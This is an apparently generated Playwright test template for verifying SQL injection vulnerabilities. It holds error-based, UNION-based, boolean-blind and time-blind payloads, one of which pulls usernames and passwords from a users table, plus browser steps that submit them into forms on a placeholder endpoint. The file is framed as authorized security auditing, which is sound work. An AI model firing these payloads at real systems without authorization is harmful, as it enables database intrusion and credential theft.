import { test, expect } from '@playwright/test';

/**
 * SQL Injection Security E2E Tests
 * Generated by redteam-skills generate-e2e
 *
 * PURPOSE: PoC (Proof of Concept) verification for SQLi vulnerabilities.
 * These tests PASS when SQL injection is detected (vulnerability EXISTS).
 * Use for security auditing, not regression testing.
 *
 * WARNING: These tests send attack payloads to the target.
 * Only run against authorized targets.
 */

// Error-based SQLi payloads
const ERROR_PAYLOADS = [
  "'",
  "''",
  "' OR '1'='1",
  "1' AND '1'='1",
];

// Union-based SQLi payloads
const UNION_PAYLOADS = [
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "1 UNION SELECT username,password FROM users--",
];

// Boolean-blind SQLi payloads
const BOOLEAN_PAYLOADS = {
  true_condition: "' AND 1=1--",
  false_condition: "' AND 1=2--",
};

// Time-blind SQLi payloads (DB-specific)
const TIME_PAYLOADS = {
  mysql: "' AND SLEEP(3)--",
  mssql: "'; WAITFOR DELAY '0:0:3'--",
  postgres: "'; SELECT pg_sleep(3)--",
  oracle: "' AND DBMS_LOCK.SLEEP(3)--",
};

// Common SQL error patterns
const SQL_ERROR_PATTERNS = [
  /sql.*syntax/i,
  /mysql.*error/i,
  /postgresql.*error/i,
  /ora-\d+/i,
  /microsoft.*sql.*server/i,
  /sqlite.*error/i,
  /unclosed.*quotation/i,
  /quoted.*string.*not.*terminated/i,
  /syntax.*error.*at.*line/i,
];

test.describe('SQL Injection Security Tests', () => {
  /**
   * Error-based SQLi Test
   * Injects malformed SQL and checks for database error messages in response
   * If error message is exposed, vulnerability exists
   */
  test('{{VULN_ID}}: Error-based SQLi at {{ENDPOINT}}', async ({ page }) => {
    for (const payload of ERROR_PAYLOADS) {
      await page.goto('{{ENDPOINT}}');

      // Fill input with SQLi payload
      await page.fill('{{INPUT_SELECTOR}}', payload);
      await page.click('button[type="submit"]');

      // Wait for response
      await page.waitForLoadState('networkidle');

      // Check for SQL error messages in page content
      const content = await page.content();
      const hasError = SQL_ERROR_PATTERNS.some(pattern => pattern.test(content));

      // PoC: Test PASSES when SQL error is detected (vulnerability EXISTS)
      expect(hasError).toBe(true);
    }
  });

  /**
   * Union-based SQLi Test
   * Injects UNION SELECT and checks for data leakage
   * If injected data appears in response, vulnerability exists
   */
  test('{{VULN_ID}}: Union-based SQLi at {{ENDPOINT}}', async ({ page }) => {
    for (const payload of UNION_PAYLOADS) {
      await page.goto('{{ENDPOINT}}');

      // Fill input with UNION payload
      await page.fill('{{INPUT_SELECTOR}}', payload);
      await page.click('button[type="submit"]');

      await page.waitForLoadState('networkidle');

      // Check for UNION injection indicators
      const content = await page.content();
      const hasUnionResult = content.includes('null') ||
                             content.includes('NULL') ||
                             SQL_ERROR_PATTERNS.some(pattern => pattern.test(content));

      // PoC: Test PASSES when UNION result or error is detected
      expect(hasUnionResult).toBe(true);
    }
  });

  /**
   * Boolean-blind SQLi Test
   * Compares responses between true and false conditions
   * If responses differ, vulnerability exists
   */
  test('{{VULN_ID}}: Boolean-blind SQLi at {{ENDPOINT}}', async ({ page }) => {
    // Request with TRUE condition
    await page.goto('{{ENDPOINT}}');
    await page.fill('{{INPUT_SELECTOR}}', BOOLEAN_PAYLOADS.true_condition);
    await page.click('button[type="submit"]');
    await page.waitForLoadState('networkidle');
    const trueContent = await page.content();
    const trueLength = trueContent.length;

    // Request with FALSE condition
    await page.goto('{{ENDPOINT}}');
    await page.fill('{{INPUT_SELECTOR}}', BOOLEAN_PAYLOADS.false_condition);
    await page.click('button[type="submit"]');
    await page.waitForLoadState('networkidle');
    const falseContent = await page.content();
    const falseLength = falseContent.length;

    // PoC: Test PASSES when response differs significantly (>10% difference)
    const difference = Math.abs(trueLength - falseLength);
    const threshold = Math.min(trueLength, falseLength) * 0.1;
    const hasDifference = difference > threshold || trueContent !== falseContent;

    expect(hasDifference).toBe(true);
  });

  /**
   * Time-blind SQLi Test
   * Injects time delay payload and measures response time
   * If response is delayed, vulnerability exists
   */
  test('{{VULN_ID}}: Time-blind SQLi at {{ENDPOINT}}', async ({ page }) => {
    const dbType = '{{DB_TYPE}}' || 'mysql';
    const payload = TIME_PAYLOADS[dbType as keyof typeof TIME_PAYLOADS] || TIME_PAYLOADS.mysql;
    const expectedDelay = 3000; // 3 seconds

    await page.goto('{{ENDPOINT}}');

    // Measure baseline response time
    const baselineStart = Date.now();
    await page.fill('{{INPUT_SELECTOR}}', 'normal_input');
    await page.click('button[type="submit"]');
    await page.waitForLoadState('networkidle');
    const baselineTime = Date.now() - baselineStart;

    // Inject time-based payload
    await page.goto('{{ENDPOINT}}');
    const attackStart = Date.now();
    await page.fill('{{INPUT_SELECTOR}}', payload);
    await page.click('button[type="submit"]');
    await page.waitForLoadState('networkidle');
    const attackTime = Date.now() - attackStart;

    // PoC: Test PASSES when response time is significantly delayed
    // Attack should take at least 2 seconds longer than baseline
    const timeDifference = attackTime - baselineTime;
    expect(timeDifference).toBeGreaterThan(expectedDelay - 1000);
  });

  /**
   * Authenticated SQLi Test
   * Logs in first, then tests for SQLi in authenticated context
   */
  test('{{VULN_ID}}: Authenticated SQLi at {{ENDPOINT}}', async ({ page }) => {
    // Login first
    await page.goto('{{AUTH_ENDPOINT}}');
    await page.fill('#email', process.env.AUTH_EMAIL || '{{AUTH_EMAIL}}');
    await page.fill('#password', process.env.AUTH_PASSWORD || '{{AUTH_PASSWORD}}');
    await page.click('button[type="submit"]');

    // Wait for authentication
    await page.waitForURL((url) => !url.pathname.includes('login'), { timeout: 10000 });

    // Test for SQLi after authentication
    await page.goto('{{ENDPOINT}}');
    await page.fill('{{INPUT_SELECTOR}}', ERROR_PAYLOADS[0]);
    await page.click('button[type="submit"]');
    await page.waitForLoadState('networkidle');

    const content = await page.content();
    const hasError = SQL_ERROR_PATTERNS.some(pattern => pattern.test(content));

    expect(hasError).toBe(true);
  });
});
